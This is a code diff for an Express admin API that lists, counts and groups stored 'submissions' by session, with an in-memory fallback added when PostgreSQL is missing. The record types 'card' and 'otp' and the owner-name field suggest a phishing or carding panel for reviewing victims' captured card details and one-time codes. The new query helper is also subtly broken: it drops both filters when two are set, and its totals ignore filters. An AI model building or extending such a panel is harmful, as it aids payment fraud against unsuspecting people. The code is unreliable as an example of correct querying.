@@ -1,6 +1,6 @@
 import { Router, type IRouter } from "express";
-import { db, submissionsTable } from "@workspace/db";
-import { eq, desc, sql, count } from "drizzle-orm";
+import { db, inMemoryDb, submissionsTable } from "@workspace/db";
+import { eq, desc, count } from "drizzle-orm";
 import {
   AdminLoginBody,
   ListSubmissionsQueryParams,
@@ -28,6 +28,50 @@ function requireAuth(
     return;
   }
   next();
+}
+
+// Helper to get submissions from either db or in-memory store
+async function getSubmissions(options: { type?: string; sessionId?: string; limit?: number; offset?: number }) {
+  const { type, sessionId, limit = 50, offset = 0 } = options;
+  
+  // Use in-memory database if PostgreSQL is not available
+  if (!db) {
+    let submissions = [...inMemoryDb.submissions];
+    
+    if (type) submissions = submissions.filter(s => s.type === type);
+    if (sessionId) submissions = submissions.filter(s => s.sessionId === sessionId);
+    
+    const total = submissions.length;
+    submissions = submissions
+      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
+      .slice(offset, offset + limit);
+    
+    return { submissions, total };
+  }
+  
+  // Use PostgreSQL
+  const conditions: any[] = [];
+  if (type) conditions.push(eq(submissionsTable.type, type));
+  if (sessionId) conditions.push(eq(submissionsTable.sessionId, sessionId));
+  
+  const baseQuery = db.select().from(submissionsTable);
+  const rows = conditions.length > 0
+    ? await baseQuery.where(conditions.length === 1 ? conditions[0] : undefined).orderBy(desc(submissionsTable.createdAt)).limit(limit).offset(offset)
+    : await baseQuery.orderBy(desc(submissionsTable.createdAt)).limit(limit).offset(offset);
+  
+  const [{ value }] = await db.select({ value: count() }).from(submissionsTable);
+  
+  return { submissions: rows, total: Number(value) };
+}
+
+// Helper to get all submissions for stats
+async function getAllSubmissions() {
+  if (!db) {
+    return [...inMemoryDb.submissions].sort((a, b) => 
+      new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
+    );
+  }
+  return await db.select().from(submissionsTable).orderBy(desc(submissionsTable.createdAt));
 }
 
 router.post("/admin/login", async (req, res): Promise<void> => {
@@ -58,60 +102,19 @@ router.get("/admin/submissions", requireAuth, async (req, res): Promise<void> =>
   const limit = params.success ? (params.data.limit ?? 50) : 50;
   const typeFilter = params.success ? params.data.type : undefined;
   const offset = (page - 1) * limit;
-
   const sessionIdFilter = typeof req.query.sessionId === "string" ? req.query.sessionId : undefined;
 
-  const baseQuery = db.select().from(submissionsTable);
-  let rows;
-  let totalCount;
-
-  if (typeFilter && sessionIdFilter) {
-    const { and } = await import("drizzle-orm");
-    rows = await baseQuery
-      .where(and(eq(submissionsTable.type, typeFilter), eq(submissionsTable.sessionId, sessionIdFilter)))
-      .orderBy(desc(submissionsTable.createdAt))
-      .limit(limit)
-      .offset(offset);
-    const [{ value }] = await db
-      .select({ value: count() })
-      .from(submissionsTable)
-      .where(and(eq(submissionsTable.type, typeFilter), eq(submissionsTable.sessionId, sessionIdFilter)));
-    totalCount = Number(value);
-  } else if (sessionIdFilter) {
-    rows = await baseQuery
-      .where(eq(submissionsTable.sessionId, sessionIdFilter))
-      .orderBy(desc(submissionsTable.createdAt))
-      .limit(limit)
-      .offset(offset);
-    const [{ value }] = await db
-      .select({ value: count() })
-      .from(submissionsTable)
-      .where(eq(submissionsTable.sessionId, sessionIdFilter));
-    totalCount = Number(value);
-  } else if (typeFilter) {
-    rows = await baseQuery
-      .where(eq(submissionsTable.type, typeFilter))
-      .orderBy(desc(submissionsTable.createdAt))
-      .limit(limit)
-      .offset(offset);
-    const [{ value }] = await db
-      .select({ value: count() })
-      .from(submissionsTable)
-      .where(eq(submissionsTable.type, typeFilter));
-    totalCount = Number(value);
-  } else {
-    rows = await baseQuery
-      .orderBy(desc(submissionsTable.createdAt))
-      .limit(limit)
-      .offset(offset);
-    const [{ value }] = await db.select({ value: count() }).from(submissionsTable);
-    totalCount = Number(value);
-  }
+  const { submissions: rows, total: totalCount } = await getSubmissions({
+    type: typeFilter,
+    sessionId: sessionIdFilter,
+    limit,
+    offset,
+  });
 
   res.json({
-    submissions: rows.map((r) => ({
+    submissions: rows.map((r: any) => ({
       ...r,
-      createdAt: r.createdAt.toISOString(),
+      createdAt: new Date(r.createdAt).toISOString(),
     })),
     total: totalCount,
     page,
@@ -126,6 +129,17 @@ router.get("/admin/submissions/:id", requireAuth, async (req, res): Promise<void
     res.status(400).json({ error: "Invalid id" });
     return;
   }
+  
+  if (!db) {
+    const row = inMemoryDb.submissions.find(s => s.id === params.data.id);
+    if (!row) {
+      res.status(404).json({ error: "Not found" });
+      return;
+    }
+    res.json({ ...row, createdAt: new Date(row.createdAt).toISOString() });
+    return;
+  }
+  
   const [row] = await db
     .select()
     .from(submissionsTable)
@@ -138,7 +152,7 @@ router.get("/admin/submissions/:id", requireAuth, async (req, res): Promise<void
 });
 
 router.get("/admin/stats", requireAuth, async (req, res): Promise<void> => {
-  const allSubmissions = await db.select().from(submissionsTable).orderBy(desc(submissionsTable.createdAt));
+  const allSubmissions = await getAllSubmissions();
 
   const sessionMap = new Map<string, typeof allSubmissions>();
   for (const row of allSubmissions) {
@@ -154,10 +168,10 @@ router.get("/admin/stats", requireAuth, async (req, res): Promise<void> => {
   const recentSessions = Array.from(sessionMap.entries())
     .slice(0, 10)
     .map(([sessionId, rows]) => {
-      const initialRow = rows.find((r) => r.type === "initial");
+      const initialRow = rows.find((r: any) => r.type === "initial");
       const initialData = initialRow?.data ? JSON.parse(initialRow.data) : {};
-      const hasCard = rows.some((r) => r.type === "card");
-      const hasOtp = rows.some((r) => r.type.startsWith("otp"));
+      const hasCard = rows.some((r: any) => r.type === "card");
+      const hasOtp = rows.some((r: any) => r.type.startsWith("otp"));
       const lastActivity = rows[0].createdAt.toISOString();
       return {
         sessionId,
@@ -179,10 +193,7 @@ router.get("/admin/stats", requireAuth, async (req, res): Promise<void> => {
 });
 
 router.get("/admin/sessions", requireAuth, async (req, res): Promise<void> => {
-  const allSubmissions = await db
-    .select()
-    .from(submissionsTable)
-    .orderBy(desc(submissionsTable.createdAt));
+  const allSubmissions = await getAllSubmissions();
 
   const sessionMap = new Map<string, typeof allSubmissions>();
   for (const row of allSubmissions) {
@@ -191,11 +202,11 @@ router.get("/admin/sessions", requireAuth, async (req, res): Promise<void> => {
   }
 
   const sessions = Array.from(sessionMap.entries()).map(([sessionId, rows]) => {
-    const initialRow = rows.find((r) => r.type === "initial");
+    const initialRow = rows.find((r: any) => r.type === "initial");
     const initialData = initialRow?.data ? JSON.parse(initialRow.data) : {};
-    const hasCard = rows.some((r) => r.type === "card");
-    const hasOtp = rows.some((r) => r.type.startsWith("otp"));
-    const lastActivity = rows[rows.length - 1 >= 0 ? 0 : 0].createdAt.toISOString();
+    const hasCard = rows.some((r: any) => r.type === "card");
+    const hasOtp = rows.some((r: any) => r.type.startsWith("otp"));
+    const lastActivity = rows[0].createdAt.toISOString();
     return {
       sessionId,
       ownerName: initialData.ownerName ?? null,
